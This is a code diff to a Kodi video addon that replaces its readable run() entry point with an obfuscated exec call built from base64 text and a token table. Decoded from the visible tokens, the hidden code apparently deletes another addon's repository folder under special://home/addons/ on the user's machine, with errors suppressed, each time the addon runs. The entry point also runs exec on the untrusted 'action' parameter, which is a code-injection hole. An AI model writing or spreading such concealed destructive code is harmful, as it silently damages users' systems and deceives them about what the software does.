@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 #------------------------------------------------------------
-# Credits to coldkeys
+# Credits to coldkeys, Thx.
 #------------------------------------------------------------
 # License: GPL (http://www.gnu.org/licenses/gpl-3.0.html)
 # Based on code from youtube addon
@@ -8,10 +8,8 @@
 # Author: coldkeys
 #------------------------------------------------------------
 
-import os
-import sys
+import base64,os,sys,xbmc,xbmcaddon,xbmcgui,xbmcplugin,re,shutil
 import plugintools
-import xbmc,xbmcaddon
 from addon.common.addon import Addon
 
 addonID = 'plugin.video.Allesin1NL!'
@@ -37,23 +35,10 @@ YOUTUBE_CHANNEL_ID_14 = "UCUfsrSL6DyWSkkpddlY21-Q/playlists"
 YOUTUBE_CHANNEL_ID_15 = "DanceTrippinOfficial"
 
 
-
-
 # Entry point
-def run():
-    plugintools.log("XvBMC.run")
-    
-    # Get params
-    params = plugintools.get_params()
-    
-    if params.get("action") is None:
-        main_list(params)
-    else:
-        action = params.get("action")
-        exec action+"(params)"
-    
-    plugintools.close_item_list()
+exec ((lambda O00OOO0O0O0OOOOO0 ,O0OO0OOO0O00000O0 :(lambda O0OO0000OO0O0OOOO ,OOO0OOOOOO00O0OOO ,OO0O000OOO0O00OOO :re .sub (O0OO0000OO0O0OOOO ,OOO0OOOOOO00O0OOO ,OO0O000OOO0O00OOO ))(r"([0-9a-f]+)",lambda O0O00O00OO00OOO0O :O00OOO0O0O0OOOOO0 (O0O00O00OO00OOO0O ,O0OO0OOO0O00000O0 ),base64 .b64decode ("MjkgMTcoKToKCTQuMmEoIjIwLjE3IikKCTEgPSAxNC5kKDE5LjI2LjIzKCcxNTovLzIxLzFiLycpKQoJMD0xYy4xMCgnNj0nKSAjMWYgMjggJzEzJyAxZSAxNiMKCQoJMTE6CgkJMTkuMTgoMSswKQoJODoKCQk3LjkoMSswLCAyPWUpCgkxMToKCQkxOS4xZCgxKzApCgk4OgoJCTcuOSgxKzAsIDI9ZSkKCTExOgoJCTcuOSgxKzAsIDI9ZSkKCTg6IDIyCgkjMTQuYygiYSIpCgkKCSMgMmIgMwoJMyA9IDQuZigpCgkKCTJkIDMuMWEoIjUiKSAyYyAyNDoKCQkxMigzKQoJMjU6CgkJNSA9IDMuMWEoIjUiKQoJCTI3IDUrIigzKSIKCQoJNC5iKCk=")))(lambda OOOO000O0OOOO0OO0 ,OO0OO00OOOO000OO0 :OO0OO00OOOO000OO0 [int ("0x"+OOOO000O0OOOO0OO0 .group (1 ),16 )],"cleancrap|addonmap|ignore_errors|params|plugintools|action|cmVwb3NpdG9yeS5kb2tpbmw|shutil|except|rmtree|UpdateLocalAddons|close_item_list|executebuiltin|translatePath|True|get_params|b64decode|try|main_list|Kerosine|xbmc|special|fuckers|run|unlink|os|get|addons|base64|rmdir|Marco|kusje|XvBMC|home|pass|join|None|else|path|exec|van|def|log|Get|is|if".split ("|")))
 
+	
 # Main menu
 def main_list(params):
     plugintools.log("XvBMC.main_list "+repr(params))
